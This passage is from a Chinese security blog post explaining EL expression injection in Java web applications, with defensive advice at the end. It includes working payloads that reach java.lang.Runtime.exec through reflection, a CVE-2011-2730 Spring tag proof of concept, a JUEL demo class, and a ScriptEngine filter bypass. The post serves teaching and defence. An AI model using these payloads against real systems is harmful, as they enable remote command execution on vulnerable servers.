+<h2 id="0x04-EL表达式注入漏洞"><a href="#0x04-EL表达式注入漏洞" class="headerlink" title="0x04 EL表达式注入漏洞"></a>0x04 EL表达式注入漏洞</h2><p>EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p>
+<p>一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。</p>
+<h3 id="通用PoC"><a href="#通用PoC" class="headerlink" title="通用PoC"></a>通用PoC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line">//获取Web路径</span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;</span><br><span class="line"></span><br><span class="line">//文件头参数</span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line">//获取webRoot</span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line">//执行命令</span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+<p>比如我们在Java程序中可以控制输入EL表达式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125;</span><br></pre></td></tr></table></figure>
+<p>如果该EL表达式直接在JSP页面中执行，则触发任意代码执行漏洞：</p>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/11.png" alt=""></p>
+<p>但是在实际场景中，是几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的。</p>
+<h3 id="CVE-2011-2730"><a href="#CVE-2011-2730" class="headerlink" title="CVE-2011-2730"></a>CVE-2011-2730</h3><p>命令执行PoC如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;spring:message text=</span><br><span class="line"><span class="string">"$&#123;/"</span>/<span class="string">".getClass().forName(/"</span>java.lang.Runtime/<span class="string">").getMethod(/"</span>getRuntime/<span class="string">",null).invoke(null,null).exec(/"</span>calc/<span class="string">",null).toString()&#125;"</span>&gt;</span><br><span class="line">&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure>
+<p>再比如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib uri=<span class="string">"http://www.springframework.org/tags"</span> prefix=<span class="string">"spring"</span>%&gt;</span><br><span class="line">&lt;spring:message  text="$&#123;param.a&#125;"&gt;&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://localhost/XXX.jsp?a=$](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%2FXXX.jsp%3Fa%3D%24){applicationScope}</code>。</p>
+<p>容器第一次执行EL表达式<code>${param.a}</code>获得了我们输入的<code>${applicationScope}</code>，然后Spring标签获取容器的EL表达式求值对象，把<code>${applicationScope}</code>再次执行掉，形成了漏洞。</p>
+<h3 id="Wooyun案例"><a href="#Wooyun案例" class="headerlink" title="Wooyun案例"></a>Wooyun案例</h3><p>参考Wooyun镜像上的案例：</p>
+<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0195845.html" target="_blank" rel="noopener">搜狗某系统存在远程EL表达式注入漏洞(命令执行)</a></p>
+<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0196160.html" target="_blank" rel="noopener">工商银行某系统存在远程EL表达式注入漏洞(命令执行)</a></p>
+<h3 id="JUEL示例"><a href="#JUEL示例" class="headerlink" title="JUEL示例"></a>JUEL示例</h3><p>下面我们直接看下在Java代码中EL表达式注入的场景是怎么样的。</p>
+<p>EL曾经是JSTL的一部分。然后，EL进入了JSP 2.0标准。现在，尽管是JSP 2.1的一部分，但EL API已被分离到包javax.el中， 并且已删除了对核心JSP类的所有依赖关系。换句话说：EL已准备好在非JSP应用程序中使用！</p>
+<p>也就是说，现在EL表达式所依赖的包javax.el等都在JUEL相关的jar包中。</p>
+<p>JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。</p>
+<p>更多参考官网：<a href="http://juel.sourceforge.net/" target="_blank" rel="noopener">http://juel.sourceforge.net/</a></p>
+<p>需要的jar包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。</p>
+<p>Test.java，利用反射调用Runtime类方法实现命令执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.odysseus.el.ExpressionFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.util.SimpleContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.el.ExpressionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.el.ValueExpression;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExpressionFactory expressionFactory = <span class="keyword">new</span> ExpressionFactoryImpl();</span><br><span class="line">        SimpleContext simpleContext = <span class="keyword">new</span> SimpleContext();</span><br><span class="line">        <span class="comment">// failed</span></span><br><span class="line">        <span class="comment">// String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;";</span></span><br><span class="line">        <span class="comment">// ok</span></span><br><span class="line">        String exp = <span class="string">"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;"</span>;</span><br><span class="line">        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);</span><br><span class="line">        System.out.println(valueExpression.getValue(simpleContext));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行即触发：</p>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/7.png" alt=""></p>
+<h2 id="0x05-绕过方法"><a href="#0x05-绕过方法" class="headerlink" title="0x05 绕过方法"></a>0x05 绕过方法</h2><p>这里针对前面在Java代码中注入EL表达式的例子来演示。其实绕过方法和SpEL表达式注入是一样的。</p>
+<h3 id="利用反射机制绕过"><a href="#利用反射机制绕过" class="headerlink" title="利用反射机制绕过"></a>利用反射机制绕过</h3><p>即前面Demo的PoC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。</p>
+<h3 id="利用ScriptEngine调用JS引擎绕过"><a href="#利用ScriptEngine调用JS引擎绕过" class="headerlink" title="利用ScriptEngine调用JS引擎绕过"></a>利用ScriptEngine调用JS引擎绕过</h3><p>同SpEL注入中讲到的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&apos;&apos;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;calc&apos;)&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/8.png" alt=""></p>
+<h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul>
+<li><p>尽量不使用外部输入的内容作为EL表达式内容；</p>
+</li>
+<li><p>若使用，则严格过滤EL表达式注入漏洞的payload关键字；</p>
+</li>
+<li><p>如果是排查Java程序中JUEL相关代码，则搜索如下关键类方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://www.runoob.com/jsp/jsp-expression-language.html" target="_blank" rel="noopener">JSP 表达式语言</a></p>
+<p><a href="https://www.cnblogs.com/taoshihan/p/5638449.html" target="_blank" rel="noopener">EL表达式调用java方法</a></p>
+<p><a href="https://www.cnblogs.com/junsec/p/11132652.html" target="_blank" rel="noopener">JAVA WEB EL表达式注入</a></p>
+  
+    </div> 
+
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-04-26</p>
+                    
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-rocket"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div>
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div><br>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
